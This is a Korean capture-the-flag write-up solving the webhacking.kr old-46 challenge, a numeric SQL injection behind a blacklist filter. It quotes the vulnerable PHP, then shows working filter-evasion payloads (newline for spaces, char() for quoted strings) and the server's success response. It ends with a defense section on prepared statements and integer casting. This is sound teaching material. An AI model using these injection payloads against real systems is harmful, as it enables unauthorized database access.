[webhacking.kr](https://webhacking.kr)의 **old-46** 문제를 풀었다.
앞서 다룬 old-18이 "따옴표로 문자열을 탈출하는 **고전 SQL 인젝션**", old-21이 "응답 차이만으로 비밀번호를 긁어내는 **Blind SQL Injection**"이었다면,
old-46은 **인젝션 자체는 쉽지만 필터가 거추장스러운** 숫자형(numeric) 인젝션이다.

따옴표가 필요 없는 숫자 자리에 들어가는데, 정작 공백·슬래시·별표·퍼센트가 전부 제거되고 `select`·`0x`·`limit` 키워드는 아예 접속을 끊어 버린다.
그래서 이 문제의 재미는 "어떻게 인젝션하느냐"가 아니라 **"무엇으로 공백과 문자열을 대신하느냐"** 에 있다.

이 글은 추측이 아니라 **공개된 소스를 읽고, 실제로 서버에 요청을 보내 각 응답을 관찰하며 필터의 동작을 하나씩 확인한 뒤, 최종 페이로드로 통과(`Pwned`)까지 확인** 한 과정을 그대로 정리한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-46 (`/challenge/web-23/`) |
| 배점 | 30점 |
| 유형 | 숫자형 SQL Injection + 필터 우회 |
| 목표 | 조회 결과의 `id`가 `admin`인 행을 반환시키기 |

화면에는 `SQL INJECTION` 제목과 **`level` 입력창** 하나뿐이다. 값은 `GET`으로 넘어가고, 결과로 해당 레벨 사용자의 `id`와 `money`를 보여 준다.

## 2. 소스 분석 — 무엇이 막혀 있나

이 문제는 `view-source`로 서버 코드를 공개한다. 핵심만 옮기면 이렇다.

```php
if($_GET['lv']){
  $db = dbconnect();
  $_GET['lv'] = addslashes($_GET['lv']);
  $_GET['lv'] = str_replace(" ","",$_GET['lv']);   // 공백 제거
  $_GET['lv'] = str_replace("/","",$_GET['lv']);   // / 제거
  $_GET['lv'] = str_replace("*","",$_GET['lv']);   // * 제거
  $_GET['lv'] = str_replace("%","",$_GET['lv']);   // % 제거
  if(preg_match("/select|0x|limit|cash/i",$_GET['lv'])) exit();
  $result = mysqli_fetch_array(mysqli_query($db,
    "select id,cash from chall46 where lv=$_GET[lv]"));   // ← 따옴표 없는 숫자 자리
  if($result){
    echo("{$result['id']} information<br><br>money : {$result['cash']}");
    if($result['id'] == "admin") solve(46);               // ← id가 admin이면 통과
  }
}
```

쿼리는 `where lv=$_GET[lv]` — **`lv`이 따옴표 없이 그대로** 들어간다. 즉 문자열 탈출(`'`)이 필요 없는 **숫자형 인젝션** 이고, 목표는 조회된 행의 `id`가 `admin`이 되게 만드는 것이다.

막혀 있는 것을 정리하면:

| 막는 방법 | 대상 | 효과 |
| --- | --- | --- |
| `addslashes` | `'` `"` `\` | 따옴표가 `\'`로 이스케이프됨 → 문자열 리터럴을 못 씀 |
| `str_replace` | 공백 ` ` `/` `*` `%` | **통째로 삭제** → 공백·주석(`/**/`)·일부 연산 불가 |
| `preg_match … exit()` | `select` `0x` `limit` `cash` | 하나라도 있으면 **즉시 종료** |

여기서 함정이 하나 보인다. **`/`와 `*`가 제거되므로 `/**/`(인라인 주석)로 공백을 대신하는 흔한 수법이 통하지 않는다.** `/**/`는 `/`·`*`가 지워지면서 빈 문자열이 되어 토큰이 붙어 버린다.

## 3. 먼저 관찰 — 정상 응답과 테이블 구조

정상 입력으로 서버가 무엇을 돌려주는지부터 봤다. 아래는 전부 **실제 응답** 이다.

| 요청 | 결과 |
| --- | --- |
| `?lv=1` | `ltusy information` / `money : 1100` |
| `?lv=2` | `udnrg information` / `money : 800` |

`id`가 `ltusy`, `udnrg`처럼 **무작위 문자열** 이다. 즉 `admin`이 몇 번 레벨인지 알 수 없으니, `lv` 숫자를 맞혀서는 admin을 찾을 수 없고 **`id='admin'` 조건으로 직접 조회** 해야 한다.

## 4. 필터 우회 — 공백 없이, 따옴표 없이

목표 쿼리는 이런 모양이다.

```sql
select id,cash from chall46 where lv=-1 or id='admin'
```

`lv=-1`은 아무 행도 없는 값이라 `or id='admin'`만 남아 admin 행을 조회한다. 문제는 이 문장을 **공백 없이, 따옴표 없이** 만들어야 한다는 것. 세 가지 걸림돌을 하나씩 실제 응답으로 확인하며 치웠다.

### (1) 따옴표 → `char()`

`id='admin'`처럼 따옴표를 쓰면 `addslashes`가 `id=\'admin\'`로 바꿔 쿼리를 깨뜨린다. 실제로 그렇게 나온다.

```text
?lv=-1%0aor%0aid='admin'
→ (아무 정보도 안 나옴 — 쿼리가 깨져 조회 실패)
```

따옴표를 안 쓰고 문자열 `admin`을 만들려면 `char()`를 쓴다. `a,d,m,i,n`의 ASCII는 각각 `97,100,109,105,110`.

```sql
char(97,100,109,105,110)   -- = 'admin'
```

> 흔히 쓰는 `0x61646d696e`(16진 리터럴)도 생각나지만, **`0x`가 금지어라 `exit()`** 로 막힌다. 그래서 `char()` 쪽이 정답이다.

### (2) 공백 → 개행(`%0a`)

`str_replace(" ","")`는 **ASCII 0x20(스페이스)만** 지운다. 반면 **개행 문자(`\n`, `%0a`)는 건드리지 않는데, MySQL은 개행도 공백처럼 토큰 구분자로 취급** 한다. 그래서 공백 자리에 `%0a`를 넣는다.

실제로 진짜 스페이스(`%20`)를 쓰면 지워져서 `-1or...`로 붙어 깨지고, `%0a`를 쓰면 정상 동작한다.

```text
?lv=-1%20or%20id=char(97,100,109,105,110)   → (스페이스 삭제 → 토큰 붙음 → 실패)
?lv=-1%0aor%0aid=char(97,100,109,105,110)   → (개행이 공백 역할 → 정상)
```

### (3) `||`는 OR가 아니었다

처음엔 `or`조차 공백 없이 붙이기 번거로워 `||`(논리 OR)를 썼는데, **이 서버에선 `||`가 OR로 동작하지 않았다.** 아래 요청은 `ltusy` 행을 돌려줄 것 같지만 실제론 아무것도 안 나온다.

```text
?lv=-1||id=char(108,116,117,115,121)   → (빈 결과)
```

`||`가 문자열 결합(`PIPES_AS_CONCAT`)으로 해석되어 `lv = concat(-1, id, 'ltusy')` 꼴이 되면서 숫자 비교가 어긋난 것으로 보인다. 그래서 `||` 대신 **개행으로 감싼 `or`** 를 쓰는 것이 확실하다. 알려진 행으로 먼저 검증했다.

```text
?lv=-1%0aor%0aid=char(108,116,117,115,121)   → ltusy information / money : 1100  ✅
```

`-1 or id='ltusy'`가 정확히 동작한다. 우회 조합(개행 + `char()` + `or`)이 전부 맞물린 것을 확인했으니, 이제 `admin`으로 바꾸면 된다.

## 5. 결과 — admin 행 조회로 통과

```text
?lv=-1%0aor%0aid=char(97,100,109,105,110)
```

최종 응답은 이랬다.

```html
admin information<br><br>money : 0<script>alert('old-46 Pwned!');</script>
<hr>old-46 Pwned. You got 30point. Congratz!<hr>
```

`alert('old-46 Pwned!')`가 뜨고 30점을 받았으며, `chall.php`에서도 **`✔️ old-46`** 으로 풀린 것을 확인했다. `admin`의 `money`는 `0`이었다.

> 인젝션 지점은 따옴표도 필요 없는 허술한 숫자 자리였다.
> 필터는 공백과 따옴표, 몇 개의 키워드를 열심히 지웠지만 — **개행과 `char()`라는 "지우지 않은 틈"** 하나로 전부 우회됐다.

## 왜 취약한가 — 그리고 올바른 방어

**(1) 근본 원인은 "입력을 쿼리 문자열에 섞는 것".**
숫자 자리라도 `where lv=$_GET[lv]`처럼 입력을 직접 끼워 넣으면, 따옴표가 필요 없으니 오히려 더 쉽게 조건을 덧붙일 수 있다. 해법은 늘 같다 — **파라미터 바인딩(prepared statement)**. 숫자든 문자든 입력은 **구조가 아닌 데이터** 로만 다뤄야 한다.

```php
$stmt = $db->prepare("select id,cash from chall46 where lv=?");
$stmt->bind_param("i", $_GET['lv']);   // lv 를 정수로 바인딩
$stmt->execute();
```

**(2) 블랙리스트 필터는 거의 항상 뚫린다.**
`addslashes` + `str_replace` + 키워드 금지는 전형적인 블랙리스트다. 하지만 이번처럼 **공백은 개행으로, 따옴표는 `char()`로, 16진은 `char()`로** 얼마든지 우회할 수 있다. 막아야 할 "나쁜 문자" 목록은 끝이 없다.
→ 숫자가 와야 하는 자리면 **`is_numeric()`·`(int)` 캐스팅으로 화이트리스트** 를 걸어라. `$lv = (int)$_GET['lv'];` 한 줄이면 위의 모든 우회가 무의미해진다.

**(3) 공백 제거가 곧 방어라는 착각.**
`str_replace(" ","")`는 스페이스 하나만 지운다. 탭(`\t`)·개행(`\n`)·수직탭·`/**/`(여기선 이것도 반쯤 막혔지만) 등 **"공백처럼 쓰이는" 다른 바이트** 는 그대로 남는다. 문자 단위로 막는 발상 자체가 깨지기 쉽다.

## 정리

- old-46은 `where lv=$_GET[lv]` 의 **따옴표 없는 숫자형 인젝션** 이고, 목표는 조회 행의 `id`를 `admin`으로 만드는 것.
- 필터: `addslashes`(따옴표), `str_replace`(공백·`/`·`*`·`%` 삭제), `select|0x|limit|cash` 금지. 그래서 `/**/`·`'admin'`·`0x..`가 전부 막힌다.
- 우회 3종: **공백 → 개행(`%0a`)**, **따옴표 → `char(97,100,109,105,110)`**, **`||`(여기선 CONCAT) 대신 개행으로 감싼 `or`**.
- 최종 페이로드 `?lv=-1%0aor%0aid=char(97,100,109,105,110)` 로 admin 행을 조회해 30점 통과.
- 방어는 **prepared statement**, **숫자 화이트리스트(`(int)`)**, 그리고 **"블랙리스트 필터를 신뢰하지 않기"**.

> 필터는 "무엇을 지울까"를 고민한 흔적이다.
> 그러나 공격자는 지워진 것이 아니라 **지우지 않은 것** 으로 들어온다 — 개행 한 글자, 함수 하나로.
